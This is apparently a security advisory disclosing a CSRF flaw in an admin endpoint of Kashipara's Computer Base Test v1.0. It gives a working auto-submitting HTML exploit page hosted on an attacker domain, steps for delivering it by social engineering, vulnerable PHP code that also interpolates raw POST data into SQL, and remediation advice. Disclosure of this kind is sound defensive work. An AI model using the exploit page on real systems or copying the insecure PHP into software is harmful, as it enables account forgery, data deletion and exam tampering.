<h1>Cross-Site Request Forgery (CSRF) in Computer Base Test V1.0 Vulnerability Report</h1>


<h2>Vulnerability Summary</h2>
A Cross-Site Request Forgery (CSRF) vulnerability was discovered in the <code>/users/adminpanel/admin/query/addExamineeExe.php</code> file of Kashipara's Computer Base Test (v1.0). No anti-CSRF token is generated or validated on any form submission. An attacker can craft a malicious HTML page that silently submits a forged POST request on behalf of an authenticated admin, creating new student accounts or performing any other state-changing action without the admin's knowledge or consent.

---

| Field               | Details                                                                 |
|---------------------|-------------------------------------------------------------------------|
| Product Name        | Computer Base Test project in PHP                                       |
| Affected Version    | v1.0                                                                    |
| Vendor              | Kashipara                                                               |
| Affected File       | `addExamineeExe.php`                                                    |
| Affected Parameter  | `fullname`, `bdate`, `gender`, `course`, `year_level`, `email`, `password` |
| Request Method      | POST                                                                    |
| Vulnerability Type  | Cross-Site Request Forgery (CSRF)                                       |
| Official Website    | [Kashipara Computer Base Test](https://www.kashipara.com/project/php/13235/computer-base-test-php-project-source-code) |

---

<h2>Steps to Reproduce</h2>
<ol>
  <li><b>Admin Login:</b> Authenticate to the admin portal using valid credentials and keep the session active.</li>
<img width="1551" height="852" alt="admin-login" src="https://github.com/user-attachments/assets/36c6dcf8-ebb9-4292-a562-03159dfc0d61" />


---

  <li><b>Prepare the CSRF Exploit Page:</b> Create the following HTML file on an attacker-controlled server (e.g., <code>http://attacker.com/csrf.html</code>). The page auto-submits a hidden form on load targeting the victim application.</li>

```html
<html>
  <body onload="document.getElementById('csrfForm').submit()">
    <form id="csrfForm"
          method="POST"
          action="http://localhost/project/users/adminpanel/admin/query/addExamineeExe.php">
      <input type="hidden" name="fullname"   value="Attacker Backdoor">
      <input type="hidden" name="bdate"      value="2000-01-01">
      <input type="hidden" name="gender"     value="male">
      <input type="hidden" name="course"     value="1">
      <input type="hidden" name="year_level" value="first year">
      <input type="hidden" name="email"      value="attacker@evil.com">
      <input type="hidden" name="password"   value="attacker123">
    </form>
  </body>
</html>
```


---

  <li><b>Intercept a Legitimate Request (Optional for Verification):</b> Configure Burp Suite (127.0.0.1:8080) and perform a normal Add Examinee action from the admin panel. Observe that the POST request contains <b>no CSRF token</b> field whatsoever.</li>


---

  <li><b>Deliver the Exploit Link:</b> Send the URL of the malicious page to the authenticated admin via email, chat, or any social engineering channel. The page can be disguised as a legitimate link.</li>



---

  <li><b>Admin Visits the Malicious Page:</b> When the authenticated admin opens the link, the hidden form auto-submits in the background using the admin's active session cookie. No interaction is required beyond opening the page.</li>
<img width="1007" height="370" alt="12 - CSRF in add student" src="https://github.com/user-attachments/assets/eb0ffa57-b28d-42a8-8a2a-4abe5d02872a" />


---

  <li><b>Observe the Forged Action:</b> Navigate back to the admin panel's Manage Examinee section. A new student account (<code>attacker@evil.com</code> / <code>attacker123</code>) has been silently created without the admin's knowledge.</li>
<img width="1819" height="899" alt="12 - CSRF in add student 2" src="https://github.com/user-attachments/assets/d4af77f2-7164-4609-bb15-e261ddfab451" />


</ol>

---

<h2>Vulnerable Code</h2>

```php
extract($_POST);
$insExmne = $conn->query(
    "INSERT INTO examinee_tbl(student_fullname, student_course, student_sex,
     student_birthdate, student_year_level, student_email, student_password)
     VALUES('$fullname','$course','$gender','$bdate','$year_level','$email','$password')"
);
```

<h2>Impact</h2>
<ul>
  <li><b>Unauthorised Account Creation:</b> An attacker can silently create backdoor student accounts, granting persistent access to the exam system.</li>
  <li><b>Data Destruction:</b> Forged requests to delete endpoints (<code>deleteCourseExe.php</code>, <code>deleteExamExe.php</code>, <code>deleteQuestionExe.php</code>) can wipe all courses, exams, and questions from the database.</li>
  <li><b>Exam Manipulation:</b> Forged requests to <code>addQuestionExe.php</code> or <code>updateQuestionExe.php</code> allow an attacker to insert or alter exam questions and correct answers without ever logging in.</li>
  <li><b>Privilege Escalation via Social Engineering:</b> By chaining CSRF with a phishing attack, a remote unauthenticated attacker gains indirect administrative control over the entire application.</li>
</ul>

---

<h2>Remediation</h2>
<ul>
  <li><b>Implement Synchroniser Token Pattern:</b> Generate a cryptographically random CSRF token per session using <code>bin2hex(random_bytes(32))</code>, store it in <code>$_SESSION</code>, embed it as a hidden field in every form, and validate it server-side before processing any state-changing request.</li>
  <li><b>SameSite Cookie Attribute:</b> Set the session cookie attribute to <code>SameSite=Strict</code> or <code>SameSite=Lax</code> to prevent the browser from sending the session cookie on cross-origin requests.</li>
  <li><b>Verify the Origin / Referer Header:</b> As a secondary defence, check that the <code>Origin</code> or <code>Referer</code> header in POST requests matches the application's own domain before processing.</li>
  <li><b>Use Framework CSRF Middleware:</b> Migrate to a modern PHP framework (e.g., Laravel, Symfony) that provides built-in, automatic CSRF protection middleware for all forms.</li>
</ul>

---

<h2>Reference</h2>
<a href="https://owasp.org/www-community/attacks/csrf">OWASP CSRF Attack Description</a>

<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP CSRF Prevention Cheat Sheet</a>

<a href="https://portswigger.net/web-security/csrf">PortSwigger CSRF Guide</a>

---

**Urgency**: Patch immediately to prevent exploitation in production environments.
